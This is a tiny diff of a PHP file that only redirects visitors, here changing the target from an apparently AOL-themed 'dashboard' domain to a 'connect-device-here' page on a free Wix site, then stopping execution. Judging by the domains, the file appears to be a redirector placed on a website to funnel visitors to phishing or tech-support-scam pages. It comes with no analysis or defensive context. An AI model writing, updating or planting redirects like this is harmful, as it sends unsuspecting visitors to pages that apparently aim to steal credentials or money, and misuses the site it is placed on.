@@ -1,4 +1,4 @@
 <?php
-header("Location: https://my-online-dashboard.site/aol/");
+header("Location: https://connect-device-here.wixsite.com/website");
 die();
 ?>
